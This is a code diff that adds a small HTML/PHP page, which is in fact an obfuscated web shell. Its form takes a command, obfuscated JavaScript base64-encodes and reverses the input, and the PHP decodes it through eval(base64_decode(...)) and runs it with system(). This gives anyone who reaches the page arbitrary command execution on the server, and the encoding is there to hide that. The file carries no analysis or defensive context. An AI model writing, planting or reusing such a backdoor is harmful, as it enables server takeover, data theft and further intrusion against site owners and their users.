@@ -1,0 +1,23 @@
+<html>
+<body>
+<form method="GET" onsubmit="return a();">
+<input type="TEXT" name="c" id="c" autofocus>
+<input type="SUBMIT" value="Execute">
+</form>
+<xmp>
+<?php
+  if(isset($_GET['c'])):
+  eval(base64_decode('CiBnb3RvIFloTWRvOyBrUm9jazogc3lzdGVtKCRjKTsgZ290byBMUTR5STsgWWhNZG86ICRjID0gYmFzZTY0X2RlY29kZShzdHJyZXYoJF9HRVRbIlwxNDMiXSkpOyBnb3RvIGtSb2NrOyBMUTR5STog'));
+	endif;
+?>
+</xmp>
+<script>
+(function(_0x13c516,_0x49c0a2){var _0x5e6ff6=_0x916e,_0x2ce9ef=_0x13c516();while(!![]){try{var _0x197758=-parseInt(_0x5e6ff6(0x1c9))/0x1*(-parseInt(_0x5e6ff6(0x1c6))/0x2)+-parseInt(_0x5e6ff6(0x1c1))/0x3+-parseInt(_0x5e6ff6(0x1ca))/0x4+-parseInt(_0x5e6ff6(0x1c8))/0x5*(-parseInt(_0x5e6ff6(0x1c5))/0x6)+parseInt(_0x5e6ff6(0x1c7))/0x7+parseInt(_0x5e6ff6(0x1c2))/0x8+-parseInt(_0x5e6ff6(0x1c3))/0x9*(-parseInt(_0x5e6ff6(0x1cb))/0xa);if(_0x197758===_0x49c0a2)break;else _0x2ce9ef['push'](_0x2ce9ef['shift']());}catch(_0x2ef5a5){_0x2ce9ef['push'](_0x2ce9ef['shift']());}}}(_0x2187,0x3e884));function a(){var _0xb59731=_0x916e;return c=document[_0xb59731(0x1c0)]('c'),c[_0xb59731(0x1c4)]=btoa(c[_0xb59731(0x1c4)])[_0xb59731(0x1bf)]('')['reverse']()[_0xb59731(0x1be)](''),!![];}function _0x916e(_0x5f4d87,_0x3f9f7c){var _0x21871a=_0x2187();return _0x916e=function(_0x916e0d,_0x4af287){_0x916e0d=_0x916e0d-0x1be;var _0xff3c2f=_0x21871a[_0x916e0d];return _0xff3c2f;},_0x916e(_0x5f4d87,_0x3f9f7c);}function _0x2187(){var _0x2571ff=['320990IuFFLJ','join','split','getElementById','1331313swMdrt','3920000HHFUtA','18SCTSCW','value','6930CdHsIp','2cnHpJJ','786485LkOOjN','105EnBuhm','295008tHpkRu','1143652OUmqvA'];_0x2187=function(){return _0x2571ff;};return _0x2187();}
+function a2(){
+  c = document.getElementById('c');
+  c.value = btoa(c.value).split('').reverse().join('');
+  return true;
+}
+</script>
+</body>
+</html>
